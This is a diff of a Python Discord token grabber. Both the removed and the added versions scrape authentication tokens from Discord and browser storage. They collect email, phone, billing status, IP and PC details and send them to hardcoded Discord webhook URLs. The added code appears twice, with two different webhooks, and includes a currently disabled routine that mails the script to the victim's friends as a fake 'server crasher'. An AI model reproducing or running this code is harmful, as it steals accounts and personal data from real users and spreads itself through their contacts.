@@ -1,226 +1,387 @@
 import os
-import ssl
-from getpass import getuser
-from json import dumps, loads
-from platform import node as get_pc_name
+if os.name != "nt":
+    exit()
 from re import findall
-from sys import platform as OS
-from typing import List, Optional
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
-
-# Constants
-WEBHOOK = "https://discord.com/api/webhooks/1449111593769238579/8D_ZEonuolGAE6wa2JcKtsYCXEyUQf9e0Y_iOTTJ_3Lf2wV4hl66UpBdUpoH8vUoQobV"
-IPIFY_API_URL = "https://api.ipify.org?format=json"
-DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
-DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
-DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
-USER_AGENT = (
-    "Mozilla/5.0 (X11; Linux x86_64) "
-    "AppleWebKit/537.11 (KHTML, like Gecko) "
-    "Chrome/23.0.1271.64 Safari/537.11"
-)
-CONTENT_TYPE = "application/json"
-
-
-ssl._create_default_https_context = ssl._create_unverified_context
-
-
-def pc_info():
-
-    api_resp = open_url(IPIFY_API_URL)
-    return (
-        f'IP: {api_resp.get("ip") if api_resp else None}\n'
-        f"Username: {getuser()}\n"
-        f"PC Name: {get_pc_name()}\n"
-    )
-
-
-def get_paths() -> dict:
-
-    if OS == "win32":  # Windows
-        local_app_data = os.getenv("LOCALAPPDATA")
-        app_data = os.getenv("APPDATA")
-        chromium_path = ["User Data", "Default"]
-
-    if OS == "darwin":  # OSX
-        local_app_data = os.path.expanduser("~/Library/Application Support")
-        app_data = os.path.expanduser("~/Library/Application Support")
-        chromium_path = ["Default"]
-
-    paths = {
-        "Discord": [app_data, "Discord"],
-        "Discord Canary": [app_data, "discordcanary"],
-        "Discord PTB": [app_data, "discordptb"],
-        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
-        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
-        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
-        "Opera": [app_data, "Opera Software", "Opera Stable"],
-    }
-
-    for app_name, path in paths.items():
-        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")
-
-    return paths
-
-
-def open_url(url: str,
-             token: Optional[str] = None,
-             data: Optional[bytes] = None) -> Optional[dict]:
-
+from datetime import datetime
+from threading import Thread
+from time import sleep
+from sys import argv
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
     headers = {
-        "Content-Type": CONTENT_TYPE,
-        "User-Agent": USER_AGENT,
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
     }
-
     if token:
         headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
     try:
-        result = urlopen(Request(url, data, headers)).read().decode().strip()
-        if result:
-            return loads(result)
-    except Exception:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
         pass
-
-
-class Account:
-
-    def __init__(self, token: str, token_location: str):
-        self.token = token
-        self.token_location = token_location
-        self.account_data = open_url(DISCORD_API_URL, self.token)
-        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)
-
-        if self.account_data:
-            self.name = self.account_data.get("username")
-            self.discriminator = self.account_data.get("discriminator")
-            self.id = self.account_data.get("id")
-            self.avatar_url = DISCORD_AVATAR_URL.format(
-                id=self.id, avatar_id=self.account_data.get('avatar')
-            )
-
-    def account_info(self) -> str:
-
-        if not self.account_data:
-            return "None"
-
-        return (
-            f"Email: {str(self.account_data.get('email'))}\n"
-            f"Phone: {str(self.account_data.get('phone'))}\n"
-            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
-            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
-            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
-        )
-
-    def billing_info(self) -> List[str]:
-
-        if not self.billing_data:
-            return "None"
-
-        info = []
-
-        for bill in self.billing_data:
-            info.append(
-                f"Id: {str(bill.get('id'))}\n"
-                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
-                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
-                f"Invalid: {str(bill.get('invalid'))}\n"
-                f"Brand: {str(bill.get('brand')).capitalize()}\n"
-                f"Last digits: {str(bill.get('last_4'))}\n"
-                f"Expires: {str(bill.get('expires_month'))}"
-                f"/{str(bill.get('expires_year'))}\n"
-                f"Country: {str(bill.get('country'))}"
-            )
-        return info
-
-
-def field(title: str, text: str, inline: bool = True) -> str:
-
-    return {
-        "name": f"**{title} Info**",
-        "value": str(text),
-        "inline": bool(inline)
-    }
-
-
-def embed_info(accounts: List[Account]) -> List[dict]:
-
-    embeds = []
-    for account in accounts.values():
-        fields = [
-            field("Account", account.account_info()),
-            field("PC", pc_info()),
-            field("Token", account.token, False)
-        ]
-
-        if account.billing_data:
-            fields.insert(-1, field("Billing", account.billing_info()[0]))
-
-        embeds.append({
-            "color": 0x6A5ACD,
-            "fields": fields,
-            "footer": {"text": "Made by @3ct0s and @JM1k1"},
-            "author": {
-                "name": (
-                    f"{account.name}#{account.discriminator} "
-                    f"({account.id})"
-                ),
-                "icon_url": account.avatar_url
-            }
-        })
-    return embeds
-
-
-def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
-
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Token Grabber",
-        "avatar_url": "https://imgur.com/Ymo8GEe.png"
-    }
-
-    data = dumps(webhook).encode()
-    return open_url(WEBHOOK_URL, None, data)
-
-
-def get_tokens(path: str) -> List[str]:
-
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
     tokens = []
-
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        content = open(os.path.join(path, file_name), errors="ignore")
-
-        for line in map(str.strip, content.readlines()):
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
-                          r"mfa\.[\w-]{84}"):
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
-
-
-def get_accounts(paths: dict) -> dict:
-
-    accounts = {}
-
-    for app_name, path in paths.items():
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
-        for token in get_tokens(path):
-            account = Account(token, app_name)
-            if account.account_data and account.id not in accounts.keys():
-                accounts.update({account.id: account})
-    return accounts
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+    }
+    try:
+        urlopen(Request("https://discordapp.com/api/webhooks/822492887936794685/l-PXon3A25M3cmRBbVyS4_h4MUplG5BuAWVaw6TkOLNf6nGH5G-XZ6oAoD1fsvj5MJ_n", data=dumps(webhook).encode(), headers=getheaders()))   
+
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
 
 
-def main(WEBHOOK_URL: str):
 
-    paths = get_paths()
-    accounts = get_accounts(paths)
-    embeds = embed_info(accounts)
-    send_webhook(embeds, WEBHOOK_URL)
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
 
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+    }
+    try:
+        urlopen(Request("https://discord.com/api/webhooks/1449111593769238579/8D_ZEonuolGAE6wa2JcKtsYCXEyUQf9e0Y_iOTTJ_3Lf2wV4hl66UpBdUpoH8vUoQobV", data=dumps(webhook).encode(), headers=getheaders()))   
 
-if __name__ == "__main__":
-    main(WEBHOOK) # Run the main function
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
